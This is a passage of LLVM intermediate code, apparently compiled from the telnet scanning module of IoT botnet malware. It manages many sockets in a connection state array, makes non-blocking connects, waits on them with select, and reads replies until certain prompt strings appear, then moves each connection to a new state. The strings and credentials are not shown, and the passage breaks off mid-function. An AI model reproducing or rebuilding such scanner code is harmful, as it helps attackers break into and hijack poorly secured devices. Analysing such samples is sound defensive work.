  %194 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %193
  %195 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %194, i32 0, i32 0
  %196 = load i32, i32* %195, align 16
  %197 = call i32 (i32, i32, ...) @fcntl(i32 %196, i32 3, i8* null)
  %198 = or i32 %197, 2048
  %199 = call i32 (i32, i32, ...) @fcntl(i32 %191, i32 4, i32 %198)
  %200 = load i32, i32* %2, align 4
  %201 = sext i32 %200 to i64
  %202 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %201
  %203 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %202, i32 0, i32 0
  %204 = load i32, i32* %203, align 16
  %205 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %206 = call i32 @connect(i32 %204, %struct.sockaddr* %205, i32 16)
  %207 = icmp eq i32 %206, -1
  br i1 %207, label %208, label %223

208:                                              ; preds = %186
  %209 = call i32* @__errno_location() #15
  %210 = load i32, i32* %209, align 4
  %211 = icmp ne i32 %210, 115
  br i1 %211, label %212, label %223

212:                                              ; preds = %208
  %213 = load i32, i32* %2, align 4
  %214 = sext i32 %213 to i64
  %215 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %214
  %216 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %215, i32 0, i32 0
  %217 = load i32, i32* %216, align 16
  %218 = call i32 @sclose(i32 %217)
  %219 = load i32, i32* %2, align 4
  %220 = sext i32 %219 to i64
  %221 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %220
  %222 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %221, i32 0, i32 3
  store i8 1, i8* %222, align 1
  br label %232

223:                                              ; preds = %208, %186
  %224 = load i32, i32* %2, align 4
  %225 = sext i32 %224 to i64
  %226 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %225
  %227 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %226, i32 0, i32 2
  store i8 1, i8* %227, align 8
  %228 = load i32, i32* %2, align 4
  %229 = sext i32 %228 to i64
  %230 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %229
  %231 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %230, i32 0, i32 6
  store i32 0, i32* %231, align 4
  br label %232

232:                                              ; preds = %223, %212
  br label %2270

233:                                              ; preds = %69
  %234 = load i32, i32* %2, align 4
  %235 = sext i32 %234 to i64
  %236 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %235
  %237 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %236, i32 0, i32 6
  %238 = load i32, i32* %237, align 4
  %239 = icmp eq i32 %238, 0
  br i1 %239, label %240, label %247

240:                                              ; preds = %233
  %241 = call i64 @time(i64* null) #12
  %242 = trunc i64 %241 to i32
  %243 = load i32, i32* %2, align 4
  %244 = sext i32 %243 to i64
  %245 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %244
  %246 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %245, i32 0, i32 6
  store i32 %242, i32* %246, align 4
  br label %247

247:                                              ; preds = %240, %233
  br label %248

248:                                              ; preds = %247
  store %struct.fd_set* %4, %struct.fd_set** %14, align 8
  store i32 0, i32* %13, align 4
  br label %249

249:                                              ; preds = %259, %248
  %250 = load i32, i32* %13, align 4
  %251 = zext i32 %250 to i64
  %252 = icmp ult i64 %251, 16
  br i1 %252, label %253, label %262

253:                                              ; preds = %249
  %254 = load %struct.fd_set*, %struct.fd_set** %14, align 8
  %255 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %254, i32 0, i32 0
  %256 = load i32, i32* %13, align 4
  %257 = zext i32 %256 to i64
  %258 = getelementptr inbounds [16 x i64], [16 x i64]* %255, i64 0, i64 %257
  store i64 0, i64* %258, align 8
  br label %259

259:                                              ; preds = %253
  %260 = load i32, i32* %13, align 4
  %261 = add i32 %260, 1
  store i32 %261, i32* %13, align 4
  br label %249, !llvm.loop !41

262:                                              ; preds = %249
  br label %263

263:                                              ; preds = %262
  br label %264

264:                                              ; preds = %263
  %265 = load i32, i32* %2, align 4
  %266 = sext i32 %265 to i64
  %267 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %266
  %268 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %267, i32 0, i32 0
  %269 = load i32, i32* %268, align 16
  %270 = srem i32 %269, 64
  %271 = zext i32 %270 to i64
  %272 = shl i64 1, %271
  %273 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %4, i32 0, i32 0
  %274 = load i32, i32* %2, align 4
  %275 = sext i32 %274 to i64
  %276 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %275
  %277 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %276, i32 0, i32 0
  %278 = load i32, i32* %277, align 16
  %279 = sdiv i32 %278, 64
  %280 = sext i32 %279 to i64
  %281 = getelementptr inbounds [16 x i64], [16 x i64]* %273, i64 0, i64 %280
  %282 = load i64, i64* %281, align 8
  %283 = or i64 %282, %272
  store i64 %283, i64* %281, align 8
  %284 = getelementptr inbounds %struct.timeval, %struct.timeval* %5, i32 0, i32 0
  store i64 0, i64* %284, align 8
  %285 = getelementptr inbounds %struct.timeval, %struct.timeval* %5, i32 0, i32 1
  store i64 10000, i64* %285, align 8
  %286 = load i32, i32* %2, align 4
  %287 = sext i32 %286 to i64
  %288 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %287
  %289 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %288, i32 0, i32 0
  %290 = load i32, i32* %289, align 16
  %291 = add nsw i32 %290, 1
  %292 = call i32 @select(i32 %291, %struct.fd_set* null, %struct.fd_set* %4, %struct.fd_set* null, %struct.timeval* %5)
  store i32 %292, i32* %3, align 4
  %293 = load i32, i32* %3, align 4
  %294 = icmp eq i32 %293, 1
  br i1 %294, label %295, label %352

295:                                              ; preds = %264
  store i32 4, i32* %6, align 4
  store i32 0, i32* %7, align 4
  %296 = load i32, i32* %2, align 4
  %297 = sext i32 %296 to i64
  %298 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %297
  %299 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %298, i32 0, i32 0
  %300 = load i32, i32* %299, align 16
  %301 = bitcast i32* %7 to i8*
  %302 = call i32 @getsockopt(i32 %300, i32 1, i32 4, i8* %301, i32* %6) #12
  %303 = load i32, i32* %7, align 4
  %304 = icmp ne i32 %303, 0
  br i1 %304, label %305, label %320

305:                                              ; preds = %295
  %306 = load i32, i32* %2, align 4
  %307 = sext i32 %306 to i64
  %308 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %307
  %309 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %308, i32 0, i32 0
  %310 = load i32, i32* %309, align 16
  %311 = call i32 @sclose(i32 %310)
  %312 = load i32, i32* %2, align 4
  %313 = sext i32 %312 to i64
  %314 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %313
  %315 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %314, i32 0, i32 2
  store i8 0, i8* %315, align 8
  %316 = load i32, i32* %2, align 4
  %317 = sext i32 %316 to i64
  %318 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %317
  %319 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %318, i32 0, i32 3
  store i8 1, i8* %319, align 1
  br label %351

320:                                              ; preds = %295
  %321 = load i32, i32* %2, align 4
  %322 = sext i32 %321 to i64
  %323 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %322
  %324 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %323, i32 0, i32 0
  %325 = load i32, i32* %324, align 16
  %326 = load i32, i32* %2, align 4
  %327 = sext i32 %326 to i64
  %328 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %327
  %329 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %328, i32 0, i32 0
  %330 = load i32, i32* %329, align 16
  %331 = call i32 (i32, i32, ...) @fcntl(i32 %330, i32 3, i8* null)
  %332 = and i32 %331, -2049
  %333 = call i32 (i32, i32, ...) @fcntl(i32 %325, i32 4, i32 %332)
  %334 = load i32, i32* %2, align 4
  %335 = sext i32 %334 to i64
  %336 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %335
  %337 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %336, i32 0, i32 6
  store i32 0, i32* %337, align 4
  %338 = load i32, i32* %2, align 4
  %339 = sext i32 %338 to i64
  %340 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %339
  %341 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %340, i32 0, i32 7
  store i16 0, i16* %341, align 16
  %342 = load i32, i32* %2, align 4
  %343 = sext i32 %342 to i64
  %344 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %343
  %345 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %344, i32 0, i32 8
  %346 = load i8*, i8** %345, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %346, i8 0, i64 1024, i1 false)
  %347 = load i32, i32* %2, align 4
  %348 = sext i32 %347 to i64
  %349 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %348
  %350 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %349, i32 0, i32 2
  store i8 2, i8* %350, align 8
  br label %2271

351:                                              ; preds = %305
  br label %371

352:                                              ; preds = %264
  %353 = load i32, i32* %3, align 4
  %354 = icmp eq i32 %353, -1
  br i1 %354, label %355, label %370

355:                                              ; preds = %352
  %356 = load i32, i32* %2, align 4
  %357 = sext i32 %356 to i64
  %358 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %357
  %359 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %358, i32 0, i32 0
  %360 = load i32, i32* %359, align 16
  %361 = call i32 @sclose(i32 %360)
  %362 = load i32, i32* %2, align 4
  %363 = sext i32 %362 to i64
  %364 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %363
  %365 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %364, i32 0, i32 2
  store i8 0, i8* %365, align 8
  %366 = load i32, i32* %2, align 4
  %367 = sext i32 %366 to i64
  %368 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %367
  %369 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %368, i32 0, i32 3
  store i8 1, i8* %369, align 1
  br label %370

370:                                              ; preds = %355, %352
  br label %371

371:                                              ; preds = %370, %351
  %372 = load i32, i32* %2, align 4
  %373 = sext i32 %372 to i64
  %374 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %373
  %375 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %374, i32 0, i32 6
  %376 = load i32, i32* %375, align 4
  %377 = add i32 %376, 10
  %378 = zext i32 %377 to i64
  %379 = call i64 @time(i64* null) #12
  %380 = icmp slt i64 %378, %379
  br i1 %380, label %381, label %396

381:                                              ; preds = %371
  %382 = load i32, i32* %2, align 4
  %383 = sext i32 %382 to i64
  %384 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %383
  %385 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %384, i32 0, i32 0
  %386 = load i32, i32* %385, align 16
  %387 = call i32 @sclose(i32 %386)
  %388 = load i32, i32* %2, align 4
  %389 = sext i32 %388 to i64
  %390 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %389
  %391 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %390, i32 0, i32 2
  store i8 0, i8* %391, align 8
  %392 = load i32, i32* %2, align 4
  %393 = sext i32 %392 to i64
  %394 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %393
  %395 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %394, i32 0, i32 3
  store i8 1, i8* %395, align 1
  br label %396

396:                                              ; preds = %381, %371
  br label %2270

397:                                              ; preds = %69
  %398 = load i32, i32* %2, align 4
  %399 = sext i32 %398 to i64
  %400 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %399
  %401 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %400, i32 0, i32 6
  %402 = load i32, i32* %401, align 4
  %403 = icmp eq i32 %402, 0
  br i1 %403, label %404, label %411

404:                                              ; preds = %397
  %405 = call i64 @time(i64* null) #12
  %406 = trunc i64 %405 to i32
  %407 = load i32, i32* %2, align 4
  %408 = sext i32 %407 to i64
  %409 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %408
  %410 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %409, i32 0, i32 6
  store i32 %406, i32* %410, align 4
  br label %411

411:                                              ; preds = %404, %397
  %412 = load i32, i32* %2, align 4
  %413 = sext i32 %412 to i64
  %414 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %413
  %415 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %414, i32 0, i32 0
  %416 = load i32, i32* %415, align 16
  %417 = load i32, i32* %2, align 4
  %418 = sext i32 %417 to i64
  %419 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %418
  %420 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %419, i32 0, i32 8
  %421 = load i8*, i8** %420, align 8
  %422 = load i32, i32* %2, align 4
  %423 = sext i32 %422 to i64
  %424 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %423
  %425 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %424, i32 0, i32 7
  %426 = load i16, i16* %425, align 16
  %427 = zext i16 %426 to i32
  %428 = call i32 @readUntil(i32 %416, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.56, i64 0, i64 0), i32 0, i32 0, i32 10000, i8* %421, i32 1024, i32 %427)
  %429 = icmp ne i32 %428, 0
  br i1 %429, label %430, label %462

430:                                              ; preds = %411
  %431 = load i32, i32* %2, align 4
  %432 = sext i32 %431 to i64
  %433 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %432
  %434 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %433, i32 0, i32 6
  store i32 0, i32* %434, align 4
  %435 = load i32, i32* %2, align 4
  %436 = sext i32 %435 to i64
  %437 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %436
  %438 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %437, i32 0, i32 7
  store i16 0, i16* %438, align 16
  %439 = load i32, i32* %2, align 4
  %440 = sext i32 %439 to i64
  %441 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %440
  %442 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %441, i32 0, i32 8
  %443 = load i8*, i8** %442, align 8
  %444 = call i8* @strstr(i8* %443, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.57, i64 0, i64 0)) #11
  %445 = icmp ne i8* %444, null
  br i1 %445, label %446, label %451

446:                                              ; preds = %430
  %447 = load i32, i32* %2, align 4
  %448 = sext i32 %447 to i64
  %449 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %448
  %450 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %449, i32 0, i32 2
  store i8 5, i8* %450, align 8
  br label %457

451:                                              ; preds = %430
  %452 = load i32, i32* %2, align 4
  %453 = sext i32 %452 to i64
  %454 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %453
  %455 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %454, i32 0, i32 8
  %456 = load i8*, i8** %455, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %456, i8 0, i64 1024, i1 false)
  br label %457

457:                                              ; preds = %451, %446
  %458 = load i32, i32* %2, align 4
  %459 = sext i32 %458 to i64
  %460 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %459
  %461 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %460, i32 0, i32 2
  store i8 3, i8* %461, align 8
  br label %2271

462:                                              ; preds = %411
  %463 = load i32, i32* %2, align 4
  %464 = sext i32 %463 to i64
  %465 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %464
  %466 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %465, i32 0, i32 0
  %467 = load i32, i32* %466, align 16
  %468 = load i32, i32* %2, align 4
  %469 = sext i32 %468 to i64
  %470 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %469
  %471 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %470, i32 0, i32 8
  %472 = load i8*, i8** %471, align 8
  %473 = load i32, i32* %2, align 4
  %474 = sext i32 %473 to i64
  %475 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %474
  %476 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %475, i32 0, i32 7
  %477 = load i16, i16* %476, align 16
  %478 = zext i16 %477 to i32
  %479 = call i32 @readUntil(i32 %467, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i64 0, i64 0), i32 0, i32 0, i32 10000, i8* %472, i32 1024, i32 %478)
  %480 = icmp ne i32 %479, 0
  br i1 %480, label %481, label %513

481:                                              ; preds = %462
  %482 = load i32, i32* %2, align 4
  %483 = sext i32 %482 to i64
  %484 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %483
  %485 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %484, i32 0, i32 6
  store i32 0, i32* %485, align 4
  %486 = load i32, i32* %2, align 4
  %487 = sext i32 %486 to i64
  %488 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %487
  %489 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %488, i32 0, i32 7
  store i16 0, i16* %489, align 16
  %490 = load i32, i32* %2, align 4
  %491 = sext i32 %490 to i64
  %492 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %491
  %493 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %492, i32 0, i32 8
  %494 = load i8*, i8** %493, align 8
  %495 = call i8* @strstr(i8* %494, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.57, i64 0, i64 0)) #11
  %496 = icmp ne i8* %495, null
  br i1 %496, label %497, label %502

497:                                              ; preds = %481
  %498 = load i32, i32* %2, align 4
  %499 = sext i32 %498 to i64
  %500 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %499
  %501 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %500, i32 0, i32 2
  store i8 5, i8* %501, align 8
  br label %508

502:                                              ; preds = %481
  %503 = load i32, i32* %2, align 4
  %504 = sext i32 %503 to i64
  %505 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %504
  %506 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %505, i32 0, i32 8
  %507 = load i8*, i8** %506, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %507, i8 0, i64 1024, i1 false)
  br label %508

508:                                              ; preds = %502, %497
  %509 = load i32, i32* %2, align 4
  %510 = sext i32 %509 to i64
  %511 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %510
  %512 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %511, i32 0, i32 2
  store i8 3, i8* %512, align 8
  br label %2271

513:                                              ; preds = %462
  %514 = load i32, i32* %2, align 4
  %515 = sext i32 %514 to i64
  %516 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %515
  %517 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %516, i32 0, i32 0
  %518 = load i32, i32* %517, align 16
  %519 = load i32, i32* %2, align 4
  %520 = sext i32 %519 to i64
  %521 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %520
  %522 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %521, i32 0, i32 8
  %523 = load i8*, i8** %522, align 8
  %524 = load i32, i32* %2, align 4
  %525 = sext i32 %524 to i64
  %526 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %525
  %527 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %526, i32 0, i32 7
  %528 = load i16, i16* %527, align 16
  %529 = zext i16 %528 to i32
  %530 = call i32 @readUntil(i32 %518, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.59, i64 0, i64 0), i32 0, i32 0, i32 10000, i8* %523, i32 1024, i32 %529)
  %531 = icmp ne i32 %530, 0
  br i1 %531, label %532, label %564

532:                                              ; preds = %513
  %533 = load i32, i32* %2, align 4
  %534 = sext i32 %533 to i64
  %535 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %534
  %536 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %535, i32 0, i32 6
  store i32 0, i32* %536, align 4
  %537 = load i32, i32* %2, align 4
  %538 = sext i32 %537 to i64
  %539 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %538
  %540 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %539, i32 0, i32 7
  store i16 0, i16* %540, align 16
  %541 = load i32, i32* %2, align 4
  %542 = sext i32 %541 to i64
  %543 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %542
  %544 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %543, i32 0, i32 8
  %545 = load i8*, i8** %544, align 8
  %546 = call i8* @strstr(i8* %545, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.57, i64 0, i64 0)) #11
  %547 = icmp ne i8* %546, null
  br i1 %547, label %548, label %553

548:                                              ; preds = %532
  %549 = load i32, i32* %2, align 4
  %550 = sext i32 %549 to i64
  %551 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %550
  %552 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %551, i32 0, i32 2
  store i8 5, i8* %552, align 8
  br label %559

553:                                              ; preds = %532
  %554 = load i32, i32* %2, align 4
  %555 = sext i32 %554 to i64
  %556 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %555
  %557 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %556, i32 0, i32 8
  %558 = load i8*, i8** %557, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %558, i8 0, i64 1024, i1 false)
  br label %559

559:                                              ; preds = %553, %548
  %560 = load i32, i32* %2, align 4
  %561 = sext i32 %560 to i64
  %562 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %561
  %563 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %562, i32 0, i32 2
  store i8 3, i8* %563, align 8
  br label %2271

564:                                              ; preds = %513
  %565 = load i32, i32* %2, align 4
  %566 = sext i32 %565 to i64
  %567 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %566
  %568 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %567, i32 0, i32 0
  %569 = load i32, i32* %568, align 16
  %570 = load i32, i32* %2, align 4
  %571 = sext i32 %570 to i64
  %572 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %571
  %573 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %572, i32 0, i32 8
  %574 = load i8*, i8** %573, align 8
  %575 = load i32, i32* %2, align 4
  %576 = sext i32 %575 to i64
  %577 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %576
  %578 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %577, i32 0, i32 7
  %579 = load i16, i16* %578, align 16
  %580 = zext i16 %579 to i32
  %581 = call i32 @readUntil(i32 %569, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.60, i64 0, i64 0), i32 0, i32 0, i32 10000, i8* %574, i32 1024, i32 %580)
  %582 = icmp ne i32 %581, 0
  br i1 %582, label %583, label %615

583:                                              ; preds = %564
  %584 = load i32, i32* %2, align 4
  %585 = sext i32 %584 to i64
  %586 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %585
  %587 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %586, i32 0, i32 6
  store i32 0, i32* %587, align 4
  %588 = load i32, i32* %2, align 4
  %589 = sext i32 %588 to i64
  %590 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %589
  %591 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %590, i32 0, i32 7
  store i16 0, i16* %591, align 16
  %592 = load i32, i32* %2, align 4
  %593 = sext i32 %592 to i64
  %594 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %593
  %595 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %594, i32 0, i32 8
  %596 = load i8*, i8** %595, align 8
  %597 = call i8* @strstr(i8* %596, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.57, i64 0, i64 0)) #11
  %598 = icmp ne i8* %597, null
  br i1 %598, label %599, label %604

599:                                              ; preds = %583
  %600 = load i32, i32* %2, align 4
  %601 = sext i32 %600 to i64
  %602 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %601
  %603 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %602, i32 0, i32 2
  store i8 5, i8* %603, align 8
  br label %610

604:                                              ; preds = %583
  %605 = load i32, i32* %2, align 4
  %606 = sext i32 %605 to i64
  %607 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %606
  %608 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %607, i32 0, i32 8
  %609 = load i8*, i8** %608, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %609, i8 0, i64 1024, i1 false)
  br label %610

610:                                              ; preds = %604, %599
  %611 = load i32, i32* %2, align 4
  %612 = sext i32 %611 to i64
  %613 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %612
  %614 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %613, i32 0, i32 2
  store i8 3, i8* %614, align 8
  br label %2271

615:                                              ; preds = %564
  %616 = load i32, i32* %2, align 4
  %617 = sext i32 %616 to i64
  %618 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %617
  %619 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %618, i32 0, i32 0
  %620 = load i32, i32* %619, align 16
  %621 = load i32, i32* %2, align 4
  %622 = sext i32 %621 to i64
  %623 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %622
  %624 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %623, i32 0, i32 8
  %625 = load i8*, i8** %624, align 8
  %626 = load i32, i32* %2, align 4
  %627 = sext i32 %626 to i64
  %628 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %627
  %629 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %628, i32 0, i32 7
  %630 = load i16, i16* %629, align 16
  %631 = zext i16 %630 to i32
  %632 = call i32 @readUntil(i32 %620, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.61, i64 0, i64 0), i32 0, i32 0, i32 10000, i8* %625, i32 1024, i32 %631)
  %633 = icmp ne i32 %632, 0
  br i1 %633, label %634, label %666

634:                                              ; preds = %615
  %635 = load i32, i32* %2, align 4
  %636 = sext i32 %635 to i64
  %637 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %636
  %638 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %637, i32 0, i32 6
  store i32 0, i32* %638, align 4
  %639 = load i32, i32* %2, align 4
  %640 = sext i32 %639 to i64
  %641 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %640
  %642 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %641, i32 0, i32 7
  store i16 0, i16* %642, align 16
  %643 = load i32, i32* %2, align 4
  %644 = sext i32 %643 to i64
  %645 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %644
  %646 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %645, i32 0, i32 8
  %647 = load i8*, i8** %646, align 8
